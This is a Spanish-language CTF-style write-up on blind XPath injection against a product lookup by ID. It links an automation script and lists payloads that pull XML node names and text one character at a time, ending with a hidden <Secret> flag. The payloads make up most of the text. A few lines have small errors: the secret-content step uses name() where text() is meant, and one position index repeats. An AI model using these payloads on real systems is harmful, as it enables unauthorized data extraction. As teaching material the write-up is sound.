
Script en python para automatizar:

[XPATHi/autoXPATH.py at main · Hamibubu/XPATHi](https://github.com/Hamibubu/XPATHi/blob/main/autoXPATH.py)``


Como podemos identificarla?
(ENTORNO):
"Estamos dentro de un buscador de productos mediante el id"

Inicio:
Comenzamos interceptando la peticion mediante burpsuite

Primero empezamos con injecciones comunes como SQL Injection
Probamos con injecciones NoSQL

Y al no tener ninguna respuesta probamos con Injecciones XPATH

Nuestro objetivo es sacar todos los campos
Lo primero que debemos de hacer es averiguar cuantas etiquetas existen

En este caso vamos a ir iterando por cada una de la letra que conforman las etiquetas es decir:

tenemos la entiqueta <Coffee> entonces vamos a ir inyectando codigo para ir iterando por cada una de la siguiente manera
		1' and substring(name (/*[1]),1,1)='C  
		< Aqui hacemos referencia a cada letra en este caso la letra C >


Para sacar cada item estoy utilizando  N' and '1'='1
("N" Lo voy cambiando a 1,2,3,4 para ir descubriendo cada item)


TENEMOS ESTA ESTRUCTURA XML(ESTO NO LO PODEMOS VER EN SITUACION REAL)

VAMOS A EXTRAER ETIQUETA RAIZ

Quiero ahora saber el NODO:
🎯 Objetivo: Obtener el nombre completo del primer nodo (Coffees) carácter por carácter

Ya tienes la base:

1' and substring(name(/*[1]),1,1)='C

✅ ¿Cómo descubrir toda la etiqueta letra por letra?

Tienes que incrementar la posición en substring() y comparar contra cada carácter esperado. Por ejemplo:
Letra	Payload
C	1' and substring(name(/*[1]),1,1)='C
o	1' and substring(name(/*[1]),2,1)='o
f	1' and substring(name(/*[1]),3,1)='f
f	1' and substring(name(/*[1]),4,1)='f
e	1' and substring(name(/*[1]),5,1)='e
e	1' and substring(name(/*[1]),6,1)='e
s	1' and substring(name(/*[1]),7,1)='s

-------------------------------------------------------------------
YA SABIENDO LA ETIQUETA RAIZ EXTRAEREMOS LAS ETIQUETAS HIJAS
Ahora quiero saber el nombre de la segunda etiqueta o nodo
Haz lo mismo que antes:
Letra	Payload
C	1' and substring(name(/*[1]/*[1]),1,1)='C
o	1' and substring(name(/*[1]/*[1]),2,1)='o
f	1' and substring(name(/*[1]/*[1]),3,1)='f
f	1' and substring(name(/*[1]/*[1]),4,1)='f
e	1' and substring(name(/*[1]/*[1]),5,1)='e
e	1' and substring(name(/*[1]/*[1]),6,1)='e


YA TENIENDO LA PRIMERA VAMOS AHORA POR LA SEGUND


Una vez que ya sabes que /*[1]/*[1]/*[1] es el nodo <ID>, ahora quieres sacar su contenido (el texto).

Eso se hace con text() así:

✅ Extraer el contenido del campo <ID> carácter por carácter

1' and substring(/*[1]/*[1]/*[1]/text(),1,1)='1'    (AQUI VAMOS PROBANDO HASTA QUE YA NO NOS SALGA NADA)

Este payload pregunta:

    ¿El primer carácter del texto dentro del primer <ID> es '1'?

Si sí, entonces vas al siguiente carácter:

1' and substring(/*[1]/*[1]/*[1]/text(),2,1)='X'  (NO DEVOLVERA NADA PERO HAY QUE PROBAR PARA IR ITERANDO POR CADA UNO)

Pero como el valor de <ID> es solo '1', ya no devolverá nada a partir del segundo carácter.


Ahora existen las sub etiquetas  ya vamos hasta ID
<Coffees>
  <Coffee ID="1">
    <ID>1</ID>             ← /*[1]/*[1]/*[1]
    <Name>Affogato</Name>  ← /*[1]/*[1]/*[2]

Entonces ahora vamos a descubrir si hay sub etiquetas e ir probando:
1' and substring(name(/*[1]/*[1]/*[2]),1,1)='N'
1' and substring(name(/*[1]/*[1]/*[2]),2,1)='a'
1' and substring(name(/*[1]/*[1]/*[2]),3,1)='m'
1' and substring(name(/*[1]/*[1]/*[2]),4,1)='e'

Ahora descubrimos que existe <Name> entonces ahora intentaremos descubrir su contenido de la siguiente manera:
1' and substring(/*[1]/*[1]/*[2]/text(),1,1)='A'
1' and substring(/*[1]/*[1]/*[2]/text(),2,1)='f'
...  -> hasta descubrir su contenido completo en este caso es Affogato

Ahora vamos a descubrir la etiqueta siguiente (RECORDEMOS QUE ESTO NO LO SABEMOS EN UN ENTORNO REAL) en este caso <Desc>
1' and substring(name(/*[1]/*[1]/*[3]),1,1)='D
1' and substring(name(/*[1]/*[1]/*[3]),2,1)='e
1' and substring(name(/*[1]/*[1]/*[3]),3,1)='s
1' and substring(name(/*[1]/*[1]/*[3]),4,1)='c

Ahora vamos a descubrir el contenido de la etiqueta <Desc>
1' and substring(/*[1]/*[1]/*[3]/text(), 1, 1) = 'A' --
1' and substring(/*[1]/*[1]/*[3]/text(), 2, 1) = 'n' --
1' and substring(/*[1]/*[1]/*[3]/text(), 3, 1) = ' ' --
1' and substring(/*[1]/*[1]/*[3]/text(), 4, 1) = 'a' --
1' and substring(/*[1]/*[1]/*[3]/text(), 5, 1) = 'f' --
1' and substring(/*[1]/*[1]/*[3]/text(), 6, 1) = 'f' --
1' and substring(/*[1]/*[1]/*[3]/text(), 7, 1) = 'o' --
1' and substring(/*[1]/*[1]/*[3]/text(), 8, 1) = 'g' --
1' and substring(/*[1]/*[1]/*[3]/text(), 9, 1) = 'a' --
...

y asi hasta descubrir su contenido

Vamos a descubri la siguiente etiqueta <Price> 

1' and substring(name(/*[1]/*[1]/*[4]),1,1)='P
1' and substring(name(/*[1]/*[1]/*[4]),2,1)='r
1' and substring(name(/*[1]/*[1]/*[4]),3,1)='i
1' and substring(name(/*[1]/*[1]/*[4]),4,1)='c
1' and substring(name(/*[1]/*[1]/*[4]),5,1)='e

Ahora su contenido
1' and substring(/*[1]/*[1]/*[4]/text(),1,1)='$
1' and substring(/*[1]/*[1]/*[4]/text(),1,1)='4
1' and substring(/*[1]/*[1]/*[4]/text(),3,1)='.
1' and substring(/*[1]/*[1]/*[4]/text(),4,1)='6
y asi sucesivamente hasta descubrir todo su contenido

Vamos por una flag que esta escondida <Secret>


1' and substring(name(/*[1]/*[1]/*[5]),1,1)='S
1' and substring(name(/*[1]/*[1]/*[5]),2,1)='e
1' and substring(name(/*[1]/*[1]/*[5]),3,1)='c
1' and substring(name(/*[1]/*[1]/*[5]),4,1)='r
1' and substring(name(/*[1]/*[1]/*[5]),5,1)='e
1' and substring(name(/*[1]/*[1]/*[5]),6,1)='t

Ahora su contenido
1' and substring(name(/*[1]/*[1]/*[5]),8,1)='E
1' and substring(name(/*[1]/*[1]/*[5]),9,1)='S
1' and substring(name(/*[1]/*[1]/*[5]),10,1)='T
1' and substring(name(/*[1]/*[1]/*[5]),11,1)='O
1' and substring(name(/*[1]/*[1]/*[5]),12,1)=' '
1' and substring(name(/*[1]/*[1]/*[5]),13,1)='E
1' and substring(name(/*[1]/*[1]/*[5]),14,1)='S
1' and substring(name(/*[1]/*[1]/*[5]),15,1)=' '
1' and substring(name(/*[1]/*[1]/*[5]),16,1)='U
1' and substring(name(/*[1]/*[1]/*[5]),17,1)='N
1' and substring(name(/*[1]/*[1]/*[5]),18,1)=' '
1' and substring(name(/*[1]/*[1]/*[5]),19,1)='M
1' and substring(name(/*[1]/*[1]/*[5]),20,1)='E
1' and substring(name(/*[1]/*[1]/*[5]),21,1)='N
1' and substring(name(/*[1]/*[1]/*[5]),22,1)='S
1' and substring(name(/*[1]/*[1]/*[5]),23,1)='A
1' and substring(name(/*[1]/*[1]/*[5]),24,1)='J
1' and substring(name(/*[1]/*[1]/*[5]),25,1)='E
1' and substring(name(/*[1]/*[1]/*[5]),26,1)=' '
1' and substring(name(/*[1]/*[1]/*[5]),27,1)='S
1' and substring(name(/*[1]/*[1]/*[5]),28,1)='E
1' and substring(name(/*[1]/*[1]/*[5]),29,1)='C
1' and substring(name(/*[1]/*[1]/*[5]),30,1)='R
1' and substring(name(/*[1]/*[1]/*[5]),31,1)='E
1' and substring(name(/*[1]/*[1]/*[5]),32,1)='T




ESTRUCTURA:
<Coffees>
  <Coffee ID="1">
    <ID>1</ID>
    <Name>Affogato</Name>
    <Desc>An affogato...</Desc>
    <Price>$4.69</Price>
    <Secret>eSTO ES UN MENSAJE SECRETO</Secret>
  </Coffee>
  <!-- Otros cafés -->
</Coffees>
